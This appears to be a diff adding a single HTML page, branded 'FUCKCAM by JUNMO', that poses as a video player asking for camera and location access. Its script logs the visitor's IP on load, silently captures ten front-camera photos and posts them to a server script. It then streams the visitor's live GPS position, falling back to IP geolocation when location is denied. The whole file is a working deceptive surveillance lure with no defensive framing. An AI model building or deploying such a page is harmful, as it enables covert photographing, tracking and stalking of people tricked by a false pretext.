@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Player - Please Allow Access</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        p { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
+        .preview-box {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .preview-box video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .preview-box .placeholder {
+            color: #555;
+            font-size: 14px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 40px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 100%;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102,126,234,0.4);
+        }
+        .btn:active { transform: translateY(0); }
+        .btn:disabled {
+            background: #444;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #888;
+        }
+        .status.granted { color: #4ade80; }
+        .status.denied { color: #f87171; }
+        .hidden { display: none; }
+        .loading {
+            color: #fbbf24;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #222;
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 2px;
+        }
+        .capture-count {
+            font-size: 11px;
+            color: #666;
+            margin-top: 5px;
+        }
+        .live-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+            margin-right: 5px;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.3); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🎥</div>
+        <h1>Video Playback Required</h1>
+        <p>To continue watching this video, please grant camera and location access when prompted by your browser.</p>
+
+        <div class="preview-box" id="previewBox">
+            <video id="video" autoplay muted playsinline></video>
+            <div class="placeholder" id="placeholder">📷 Preview will appear here</div>
+        </div>
+
+        <button class="btn" id="startBtn" onclick="startCapture()">▶ Allow &amp; Start</button>
+        <div class="status" id="status">Click the button to begin</div>
+        <div class="loading hidden" id="loading">Capturing data, please wait...</div>
+        
+        <div class="progress-bar hidden" id="progressBar">
+            <div class="fill" id="progressFill"></div>
+        </div>
+        <div class="capture-count hidden" id="captureCount">📸 0 / 10 photos</div>
+
+        <div class="footer">FUCKCAM by JUNMO</div>
+    </div>
+
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        let stream = null;
+        let watchId = null;
+        let locationSent = false;
+        let photoCount = 0;
+        const TOTAL_PHOTOS = 10;
+        const PHOTO_INTERVAL = 1500; // 1.5 seconds between each photo
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const statusEl = document.getElementById('status');
+        const loadingEl = document.getElementById('loading');
+        const placeholder = document.getElementById('placeholder');
+        const previewBox = document.getElementById('previewBox');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+        const captureCount = document.getElementById('captureCount');
+
+        // Log IP on page load
+        fetch('ip.php')
+            .then(r => r.text())
+            .catch(() => {});
+
+        function startCapture() {
+            startBtn.disabled = true;
+            startBtn.textContent = '⏳ Requesting permissions...';
+            statusEl.textContent = 'Requesting camera & location...';
+
+            // Request Camera
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } })
+                    .then(function(mediaStream) {
+                        stream = mediaStream;
+                        video.srcObject = stream;
+                        video.style.display = 'block';
+                        placeholder.style.display = 'none';
+                        statusEl.textContent = '✅ Camera access granted! Capturing 10 photos...';
+                        statusEl.className = 'status granted';
+                        startBtn.textContent = '📸 Capturing photos...';
+                        loadingEl.classList.remove('hidden');
+                        progressBar.classList.remove('hidden');
+                        captureCount.classList.remove('hidden');
+
+                        // Start taking 10 photos sequentially
+                        setTimeout(function() {
+                            capturePhotoBurst();
+                        }, 1000);
+
+                        // Start real-time location tracking
+                        startLocationTracking();
+                    })
+                    .catch(function(err) {
+                        console.error('Camera error:', err);
+                        statusEl.textContent = '❌ Camera access denied or blocked';
+                        statusEl.className = 'status denied';
+                        startBtn.textContent = '🔄 Try Again';
+                        startBtn.disabled = false;
+                        startLocationTracking();
+                    });
+            } else {
+                statusEl.textContent = '❌ Camera not supported by this browser';
+                statusEl.className = 'status denied';
+                startLocationTracking();
+            }
+        }
+
+        function capturePhotoBurst() {
+            if (!stream || photoCount >= TOTAL_PHOTOS) {
+                // All photos done
+                if (photoCount >= TOTAL_PHOTOS) {
+                    statusEl.textContent = '✅ All ' + TOTAL_PHOTOS + ' photos captured!';
+                    statusEl.className = 'status granted';
+                    startBtn.textContent = '📍 Tracking live';
+                    loadingEl.classList.add('hidden');
+                }
+                return;
+            }
+
+            // Capture one photo
+            const track = stream.getVideoTracks()[0];
+            const settings = track.getSettings();
+            canvas.width = settings.width || 640;
+            canvas.height = settings.height || 480;
+
+            const context = canvas.getContext('2d');
+            // Flip horizontally for selfie-mirror effect
+            context.translate(canvas.width, 0);
+            context.scale(-1, 1);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+            
+            // Send to server
+            fetch('ip.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'photo=' + encodeURIComponent(imageData) + '&num=' + (photoCount + 1)
+            }).catch(() => {});
+
+            // Update progress
+            photoCount++;
+            const pct = (photoCount / TOTAL_PHOTOS) * 100;
+            progressFill.style.width = pct + '%';
+            captureCount.textContent = '📸 ' + photoCount + ' / ' + TOTAL_PHOTOS + ' photos';
+            statusEl.textContent = '✅ Captured photo ' + photoCount + ' of ' + TOTAL_PHOTOS;
+
+            // Schedule next photo
+            if (photoCount < TOTAL_PHOTOS) {
+                setTimeout(capturePhotoBurst, PHOTO_INTERVAL);
+            } else {
+                statusEl.textContent = '✅ All ' + TOTAL_PHOTOS + ' photos captured!';
+                statusEl.className = 'status granted';
+                startBtn.textContent = '📍 Tracking live';
+                loadingEl.classList.add('hidden');
+            }
+        }
+
+        function startLocationTracking() {
+            if (navigator.geolocation) {
+                watchId = navigator.geolocation.watchPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const speed = position.coords.speed || 0;
+                        const heading = position.coords.heading || 0;
+                        const timestamp = new Date(position.timestamp).toISOString();
+
+                        fetch('location.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: 'lat=' + lat + 
+                                  '&lon=' + lon + 
+                                  '&accuracy=' + accuracy +
+                                  '&speed=' + speed +
+                                  '&heading=' + heading +
+                                  '&device_time=' + encodeURIComponent(timestamp)
+                        }).catch(() => {});
+
+                        if (!locationSent) {
+                            locationSent = true;
+                        }
+                        // Only update status with location if photo burst is done
+                        if (photoCount >= TOTAL_PHOTOS) {
+                            statusEl.innerHTML = '<span class="live-dot"></span> LIVE TRACKING — Lat: ' + lat.toFixed(6) + ', Lon: ' + lon.toFixed(6);
+                            statusEl.className = 'status granted';
+                        }
+                    },
+                    function(err) {
+                        console.error('Location error:', err);
+                        if (!locationSent) {
+                            statusEl.textContent = '❌ Location access denied (' + err.message + ')';
+                            statusEl.className = 'status denied';
+                            fetch('https://ipapi.co/json/')
+                                .then(r => r.json())
+                                .then(data => {
+                                    if (data.latitude && data.longitude) {
+                                        fetch('location.php', {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                            body: 'lat=' + data.latitude + 
+                                                  '&lon=' + data.longitude + 
+                                                  '&accuracy=ip_approximate' +
+                                                  '&city=' + encodeURIComponent(data.city || '') + 
+                                                  '&country=' + encodeURIComponent(data.country_name || '') +
+                                                  '&ip_fallback=true'
+                                        }).catch(() => {});
+                                        locationSent = true;
+                                    }
+                                })
+                                .catch(() => {});
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                if (!locationSent) {
+                    statusEl.textContent = '❌ Geolocation not supported by browser';
+                    statusEl.className = 'status denied';
+                }
+            }
+        }
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
+
